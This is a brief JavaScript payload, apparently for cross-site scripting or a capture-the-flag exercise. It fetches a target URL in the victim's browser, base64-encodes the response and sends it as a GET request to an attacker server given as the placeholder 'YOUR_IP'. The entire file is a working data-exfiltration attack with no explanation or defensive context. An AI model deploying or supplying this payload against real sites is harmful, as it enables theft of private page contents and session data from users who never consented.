myhtserv = 'http://YOUR_IP/'
targetu = 'http://TARGET'

req = new XMLHttpRequest;
req.onreadystatechange = function() {
	if (req.readyState == 4) {
		req2 = new XMLHttpRequest;
		req2.open('GET', myhtserv + btoa(this.responseText), false);
		req2.send();
	}
}

req.open('GET', targetu, false);
req.send();
